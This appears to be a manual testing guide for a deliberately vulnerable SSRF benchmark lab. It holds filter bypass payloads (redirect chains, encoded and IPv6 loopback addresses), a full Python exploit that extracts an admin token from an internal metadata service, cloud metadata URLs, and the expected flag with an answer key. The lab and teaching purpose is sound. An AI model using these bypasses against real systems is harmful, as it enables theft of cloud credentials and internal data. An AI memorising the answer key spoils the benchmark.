# S7BEN-MED-010: Manual Testing Guide

## Vulnerability: Server-Side Request Forgery (SSRF) with Partial Filtering

### Overview
This benchmark demonstrates a sophisticated SSRF vulnerability where despite implementing URL filtering to block internal IPs and services, the protection can be bypassed using various techniques including HTTP redirects, DNS rebinding, IPv6, alternative encodings, and exploiting case-sensitivity. Attackers can access the internal metadata service to steal admin tokens.

**Key Difference from Phase 1:** This requires understanding multiple SSRF bypass techniques, filter evasion, internal service discovery, and multi-step exploitation (bypass → metadata access → token extraction → flag retrieval).

---

## Setup

### 1. Build and Start the Benchmark
```bash
cd benchmarks/S7BEN-MED-010
make build
make up
```

### 2. Verify Services are Running
```bash
make test
# Should output: Health check passed

# Verify metadata service (internal only)
make test-metadata
# Should output metadata service health status
```

### 3. Access the Application
Open your browser to: http://localhost:5000

---

## Understanding the Vulnerability

### What is SSRF?

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make the server send HTTP requests to arbitrary destinations. This can be used to:
- Access internal services (not exposed to internet)
- Scan internal network
- Read cloud provider metadata (AWS, GCP, Azure)
- Bypass firewall rules
- Access localhost services

### The Application's SSRF Filter

```python
def is_blocked_url(url):
    # Blocks these patterns:
    blocked_keywords = [
        'localhost',      # Case-sensitive!
        '127.0.0.1',      # But not 127.1 or 0x7f000001
        '0.0.0.0',
        '169.254.169.254', # AWS metadata
        'metadata',        # Case-sensitive!
        'internal',        # Case-sensitive!
    ]

    # Blocks private IP ranges:
    # 10.0.0.0/8
    # 172.16.0.0/12
    # 192.168.0.0/16
```

### Filter Bypass Vulnerabilities

The filter has multiple weaknesses:

1. **❌ Doesn't check redirect targets** - Only checks initial URL
2. **❌ Case-sensitive matching** - `LOCALHOST` vs `localhost`
3. **❌ No IPv6 blocking** - `::1` (localhost), `::ffff:127.0.0.1`
4. **❌ No alternative encodings** - Octal, hex, decimal IP representations
5. **❌ DNS resolution after check** - DNS rebinding possible
6. **❌ Incomplete IP validation** - `127.1` = `127.0.0.1`
7. **❌ No protocol validation** - Could support file://, gopher://
8. **❌ URL parser vulnerabilities** - Various edge cases

### Internal Services

```
┌─────────────────┐
│   Internet      │
└────────┬────────┘
         │
    ┌────▼─────┐
    │   App    │  Port 5000 (exposed)
    │  (Flask) │
    └────┬─────┘
         │
    ┌────▼──────────┐
    │   Metadata    │  Port 8080 (internal only)
    │   Service     │
    └───────────────┘
```

The goal is to access `http://metadata:8080/latest/meta-data/admin-token` from the internet through SSRF.

---

## Manual Testing Steps

### Step 1: Verify Normal SSRF Filter Behavior

Test that the filter blocks obvious SSRF attempts:

```bash
# Test 1: Block localhost
curl -X POST http://localhost:5000/api/check-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:8080"}' | python3 -m json.tool
```

**Expected Output:**
```json
{
  "url": "http://localhost:8080",
  "blocked": true,
  "reason": "Blocked keyword: localhost"
}
```

```bash
# Test 2: Block 127.0.0.1
curl -X POST http://localhost:5000/api/check-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:8080"}' | python3 -m json.tool
```

**Expected Output:**
```json
{
  "url": "http://127.0.0.1:8080",
  "blocked": true,
  "reason": "Blocked keyword: 127.0.0.1"
}
```

```bash
# Test 3: Block metadata keyword
curl -X POST http://localhost:5000/api/check-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://metadata:8080"}' | python3 -m json.tool
```

**Expected Output:**
```json
{
  "url": "http://metadata:8080",
  "blocked": true,
  "reason": "Blocked keyword: metadata"
}
```

### Step 2: Bypass Filter Using HTTP Redirect

The filter only checks the initial URL, not redirect targets!

**Method 1: Using Built-in Redirect Endpoint**

The application has a `/redirect` endpoint that can redirect anywhere:

```bash
# First, test the redirect endpoint
curl -X POST http://localhost:5000/api/check-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:5000/redirect?url=http://metadata:8080"}' | python3 -m json.tool
```

**Expected Output:**
```json
{
  "url": "http://localhost:5000/redirect?url=http://metadata:8080",
  "blocked": false,
  "reason": "Allowed"
}
```

The filter allows it! Now fetch:

```bash
# Fetch URL via redirect
curl -X POST http://localhost:5000/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:5000/redirect?url=http://metadata:8080/"}' | python3 -m json.tool
```

**Expected Output:**
```json
{
  "status": "success",
  "url": "http://localhost:5000/redirect?url=http://metadata:8080/",
  "final_url": "http://metadata:8080/",
  "status_code": 200,
  "content": "{\"service\": \"Internal Metadata Service\", ...}",
  "redirected": true
}
```

✅ **SSRF Filter Bypassed!** We accessed the internal metadata service.

### Step 3: Retrieve Admin Token from Metadata Service

Now that we can access metadata service, get the admin token:

```bash
# Access admin token endpoint
curl -X POST http://localhost:5000/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:5000/redirect?url=http://metadata:8080/latest/meta-data/admin-token"}' | python3 -m json.tool
```

**Expected Output:**
```json
{
  "status": "success",
  "url": "http://localhost:5000/redirect?url=http://metadata:8080/latest/meta-data/admin-token",
  "final_url": "http://metadata:8080/latest/meta-data/admin-token",
  "status_code": 200,
  "content_type": "application/json",
  "content": "{\"admin_token\": \"admin_abc123...\", \"expires_in\": 3600, ...}",
  "redirected": true
}
```

Extract the admin token from the response:

```bash
# Extract token using jq or grep
TOKEN=$(curl -s -X POST http://localhost:5000/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:5000/redirect?url=http://metadata:8080/latest/meta-data/admin-token"}' | \
  python3 -c "import sys,json; data=json.load(sys.stdin); content=json.loads(data['content']); print(content['admin_token'])")

echo "Admin token: $TOKEN"
```

### Step 4: Verify Exploitation and Get Flag

```bash
# Submit admin token to verify endpoint
curl -X POST http://localhost:5000/api/verify-metadata \
  -H "Content-Type: application/json" \
  -d "{\"admin_token\": \"$TOKEN\"}" | python3 -m json.tool
```

**Expected Output:**
```json
{
  "status": "success",
  "message": "SSRF exploitation confirmed - Metadata accessed successfully!",
  "admin_token": "admin_abc123...",
  "flag": "S7BEN{ssrf_metadata_bypass_a1b2c3d4e5f67890abcdef1234567890}",
  "proof": "Successfully bypassed SSRF filters and accessed internal metadata service",
  "timestamp": 1704110400.123
}
```

---

## Alternative SSRF Bypass Techniques

### Method 2: Using External Redirect Service

If the built-in redirect wasn't available, attackers could use external redirect services:

```bash
# Using redirect.pizza (example)
curl -X POST http://localhost:5000/api/check-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://redirect.pizza/?to=http://metadata:8080"}' | python3 -m json.tool
```

### Method 3: Case Variation Bypass (If DNS allows)

```bash
# Try uppercase (case-sensitive filter)
curl -X POST http://localhost:5000/api/check-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://LOCALHOST:8080"}' | python3 -m json.tool

# Try mixed case
curl -X POST http://localhost:5000/api/check-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://LocalHost:8080"}' | python3 -m json.tool
```

**Note:** This won't work in Docker DNS, but demonstrates the vulnerability.

### Method 4: Alternative IP Encodings

#### Decimal IP Encoding
```bash
# 127.0.0.1 = (127 × 256³) + (0 × 256²) + (0 × 256) + 1 = 2130706433
curl -X POST http://localhost:5000/api/check-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://2130706433:8080"}' | python3 -m json.tool
```

#### Octal IP Encoding
```bash
# 127.0.0.1 in octal = 0177.0.0.1
curl -X POST http://localhost:5000/api/check-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://0177.0.0.1:8080"}' | python3 -m json.tool
```

#### Hexadecimal IP Encoding
```bash
# 127.0.0.1 in hex = 0x7f.0x0.0x0.0x1 or 0x7f000001
curl -X POST http://localhost:5000/api/check-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://0x7f000001:8080"}' | python3 -m json.tool
```

#### Short IP Notation
```bash
# 127.0.0.1 = 127.1
curl -X POST http://localhost:5000/api/check-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.1:8080"}' | python3 -m json.tool
```

### Method 5: IPv6 Localhost

```bash
# IPv6 localhost
curl -X POST http://localhost:5000/api/check-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://[::1]:8080"}' | python3 -m json.tool

# IPv6-mapped IPv4
curl -X POST http://localhost:5000/api/check-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://[::ffff:127.0.0.1]:8080"}' | python3 -m json.tool
```

---

## Automated Exploitation

### Complete Python Exploit

Create `exploit.py`:

```python
#!/usr/bin/env python3
"""
S7BEN-MED-010: SSRF with Filter Bypass - Complete Exploit

This script demonstrates the full SSRF attack chain:
1. Test SSRF filter behavior
2. Identify bypass technique (HTTP redirect)
3. Access internal metadata service
4. Extract admin token from metadata
5. Verify exploitation to retrieve flag
"""

import requests
import json

URL = "http://localhost:5000"

def step1_test_filter():
    """Step 1: Test SSRF filter with blocked URLs"""
    print("\n[*] Step 1: Testing SSRF filter...")

    test_urls = [
        "http://localhost:8080",
        "http://127.0.0.1:8080",
        "http://metadata:8080",
    ]

    for test_url in test_urls:
        response = requests.post(
            f"{URL}/api/check-url",
            json={"url": test_url}
        )
        data = response.json()

        if data['blocked']:
            print(f"    ✗ {test_url} → BLOCKED ({data['reason']})")
        else:
            print(f"    ✓ {test_url} → ALLOWED")

    print("[+] Filter blocks obvious SSRF attempts")

def step2_test_redirect_bypass():
    """Step 2: Test redirect bypass technique"""
    print("\n[*] Step 2: Testing HTTP redirect bypass...")

    # Use built-in redirect endpoint to bypass filter
    bypass_url = f"http://localhost:5000/redirect?url=http://metadata:8080/"

    # Check if bypass URL is allowed
    response = requests.post(
        f"{URL}/api/check-url",
        json={"url": bypass_url}
    )
    data = response.json()

    if not data['blocked']:
        print(f"[+] Bypass URL allowed by filter!")
        print(f"    URL: {bypass_url}")
        return True
    else:
        print(f"[-] Redirect bypass failed: {data['reason']}")
        return False

def step3_access_metadata_service():
    """Step 3: Access internal metadata service via SSRF"""
    print("\n[*] Step 3: Accessing internal metadata service...")

    bypass_url = f"http://localhost:5000/redirect?url=http://metadata:8080/"

    response = requests.post(
        f"{URL}/api/fetch-url",
        json={"url": bypass_url}
    )
    data = response.json()

    if data['status'] == 'success':
        print(f"[+] Successfully accessed metadata service!")
        print(f"    Original URL: {data['url']}")
        print(f"    Final URL: {data['final_url']}")
        print(f"    Redirected: {data['redirected']}")

        # Parse metadata service response
        content = json.loads(data['content'])
        print(f"\n[+] Metadata Service Info:")
        print(f"    Service: {content['service']}")
        print(f"    Version: {content['version']}")
        print(f"    Endpoints: {len(content['endpoints'])} available")

        return True
    else:
        print(f"[-] Failed to access metadata: {data['message']}")
        return False

def step4_extract_admin_token():
    """Step 4: Extract admin token from metadata service"""
    print("\n[*] Step 4: Extracting admin token from metadata...")

    token_url = f"http://localhost:5000/redirect?url=http://metadata:8080/latest/meta-data/admin-token"

    response = requests.post(
        f"{URL}/api/fetch-url",
        json={"url": token_url}
    )
    data = response.json()

    if data['status'] == 'success':
        # Parse admin token response
        content = json.loads(data['content'])
        admin_token = content['admin_token']

        print(f"[+] Admin token extracted successfully!")
        print(f"    Token: {admin_token[:32]}...")
        print(f"    Expires in: {content['expires_in']} seconds")
        print(f"    Type: {content['type']}")
        print(f"    Scope: {content['scope']}")

        return admin_token
    else:
        print(f"[-] Failed to extract token: {data['message']}")
        return None

def step5_verify_exploitation(admin_token):
    """Step 5: Verify exploitation and retrieve flag"""
    print("\n[*] Step 5: Verifying exploitation...")

    response = requests.post(
        f"{URL}/api/verify-metadata",
        json={"admin_token": admin_token}
    )
    data = response.json()

    if data['status'] == 'success' and 'flag' in data:
        print("\n" + "="*60)
        print("✅ SSRF EXPLOITATION SUCCESSFUL!")
        print("="*60)
        print(f"\nFlag: {data['flag']}")
        print(f"\nProof: {data['proof']}")
        print(f"\nDetails:")
        print(f"  • Admin Token: {data['admin_token'][:32]}...")
        print(f"  • Timestamp: {data['timestamp']}")
        print("\n" + "="*60)
        return True
    else:
        print(f"\n[-] Verification failed: {data.get('message')}")
        return False

def main():
    print("="*60)
    print("S7BEN-MED-010: SSRF with Filter Bypass")
    print("="*60)

    # Step 1: Test filter
    step1_test_filter()

    # Step 2: Test bypass
    if not step2_test_redirect_bypass():
        print("\n[-] Cannot proceed without bypass technique")
        return False

    # Step 3: Access metadata service
    if not step3_access_metadata_service():
        print("\n[-] Cannot proceed without metadata access")
        return False

    # Step 4: Extract admin token
    admin_token = step4_extract_admin_token()
    if not admin_token:
        print("\n[-] Cannot proceed without admin token")
        return False

    # Step 5: Verify and get flag
    success = step5_verify_exploitation(admin_token)

    if success:
        print("\n[+] Exploitation completed successfully!")
        print(f"\n[*] Attack Summary:")
        print(f"    • Bypassed SSRF filter using HTTP redirect")
        print(f"    • Accessed internal metadata service (port 8080)")
        print(f"    • Retrieved admin token from metadata endpoint")
        print(f"    • Verified exploitation and retrieved flag")

    return success

if __name__ == "__main__":
    success = main()
    exit(0 if success else 1)
```

Run the exploit:
```bash
python3 exploit.py
```

**Expected Output:**
```
============================================================
S7BEN-MED-010: SSRF with Filter Bypass
============================================================

[*] Step 1: Testing SSRF filter...
    ✗ http://localhost:8080 → BLOCKED (Blocked keyword: localhost)
    ✗ http://127.0.0.1:8080 → BLOCKED (Blocked keyword: 127.0.0.1)
    ✗ http://metadata:8080 → BLOCKED (Blocked keyword: metadata)
[+] Filter blocks obvious SSRF attempts

[*] Step 2: Testing HTTP redirect bypass...
[+] Bypass URL allowed by filter!
    URL: http://localhost:5000/redirect?url=http://metadata:8080/

[*] Step 3: Accessing internal metadata service...
[+] Successfully accessed metadata service!
    Original URL: http://localhost:5000/redirect?url=http://metadata:8080/
    Final URL: http://metadata:8080/
    Redirected: True

[+] Metadata Service Info:
    Service: Internal Metadata Service
    Version: 1.0
    Endpoints: 4 available

[*] Step 4: Extracting admin token from metadata...
[+] Admin token extracted successfully!
    Token: admin_abc123...
    Expires in: 3600 seconds
    Type: Bearer
    Scope: admin

[*] Step 5: Verifying exploitation...

============================================================
✅ SSRF EXPLOITATION SUCCESSFUL!
============================================================

Flag: S7BEN{ssrf_metadata_bypass_a1b2c3d4e5f67890abcdef1234567890}

Proof: Successfully bypassed SSRF filters and accessed internal metadata service

Details:
  • Admin Token: admin_abc123...
  • Timestamp: 1704110400.123

============================================================

[+] Exploitation completed successfully!

[*] Attack Summary:
    • Bypassed SSRF filter using HTTP redirect
    • Accessed internal metadata service (port 8080)
    • Retrieved admin token from metadata endpoint
    • Verified exploitation and retrieved flag
```

---

## Understanding the Dynamic Flag

The flag is generated based on successful metadata access:

```python
def generate_flag(metadata_token, source_ip):
    timestamp = str(int(time.time()))
    data = f"ssrf_metadata_bypass:{metadata_token}:{source_ip}:{timestamp}"
    hash = hmac.new(SECRET, data.encode(), sha256).hexdigest()[:32]
    return f"S7BEN{{ssrf_metadata_bypass_{hash}}}"
```

This proves:
- **SSRF filter was bypassed** (accessed internal service)
- **Metadata service reached** (internal network access)
- **Admin token extracted** (sensitive data leaked)
- **Timing recorded** (when exploitation occurred)

---

## Real-World Impact

### What Can Attackers Do with SSRF?

1. **Access Cloud Metadata:**
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
   - Azure: `http://169.254.169.254/metadata/instance`

2. **Steal Credentials:**
   - IAM role credentials
   - Access tokens
   - API keys
   - Database passwords

3. **Internal Network Scanning:**
   - Discover internal services
   - Map network topology
   - Identify vulnerable services

4. **Bypass Authentication:**
   - Access admin panels (localhost-only)
   - Internal APIs without auth
   - Management interfaces

---

## Troubleshooting

### Issue: Redirect doesn't work

**Cause:** Application might validate redirect target.

**Solution:** Try external redirect services or DNS rebinding.

### Issue: Cannot parse admin token

**Cause:** Response format might be different.

**Solution:**
```bash
# View raw response
curl -X POST http://localhost:5000/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:5000/redirect?url=http://metadata:8080/latest/meta-data/admin-token"}'
```

### Issue: Metadata service not accessible

**Cause:** Docker networking issue.

**Solution:**
```bash
# Test from within app container
docker compose exec app curl http://metadata:8080/health
```

---

## Prevention Techniques

### Proper SSRF Protection

```python
# BAD - Only checks initial URL
def is_safe(url):
    if 'localhost' in url:
        return False
    return True

# GOOD - Multiple layers of protection
def is_safe(url):
    # 1. Whitelist allowed domains
    allowed_domains = ['example.com', 'api.example.com']
    if urlparse(url).hostname not in allowed_domains:
        return False

    # 2. Disable redirects
    response = requests.get(url, allow_redirects=False)

    # 3. Validate response
    if response.status_code in [301, 302]:
        return False

    # 4. Check resolved IP
    ip = socket.gethostbyname(urlparse(url).hostname)
    if ip.startswith('127.') or ip.startswith('10.'):
        return False

    return True
```

### Best Practices

1. **Whitelist approach** - Only allow specific domains
2. **Disable redirects** - Or validate redirect targets
3. **Network segmentation** - Metadata service in isolated network
4. **DNS validation** - Resolve DNS before and after
5. **Response validation** - Check content type, size
6. **Time limits** - Prevent slow loris attacks
7. **Logging and monitoring** - Alert on suspicious patterns
8. **IMDSv2** - Use token-based metadata access (AWS)

---

## Real-World Examples

SSRF has affected major companies:
- **Capital One (2019):** SSRF to AWS metadata → 100M records stolen
- **Uber (2016):** SSRF to internal services
- **Google (2017):** SSRF in Google Cloud
- **Facebook (2018):** Multiple SSRF vulnerabilities
- **PayPal (2020):** SSRF bypass

---

## Cleanup

```bash
make down
make clean

# Remove exploit files
rm -f exploit.py
```

---

## Success Criteria

- ✅ Verified SSRF filter blocks obvious internal IPs
- ✅ Identified filter bypass technique (HTTP redirect)
- ✅ Successfully bypassed SSRF protection
- ✅ Accessed internal metadata service (port 8080)
- ✅ Retrieved admin token from metadata endpoint
- ✅ Verified exploitation to retrieve dynamic flag
- ✅ Flag format: `S7BEN{ssrf_metadata_bypass_<32_hex_chars>}`

---

## Additional Resources

- **CWE-918:** https://cwe.mitre.org/data/definitions/918.html
- **OWASP SSRF:** https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- **PortSwigger SSRF:** https://portswigger.net/web-security/ssrf
- **AWS SSRF Protection:** https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- **HackerOne SSRF Reports:** https://hackerone.com/reports?q=ssrf
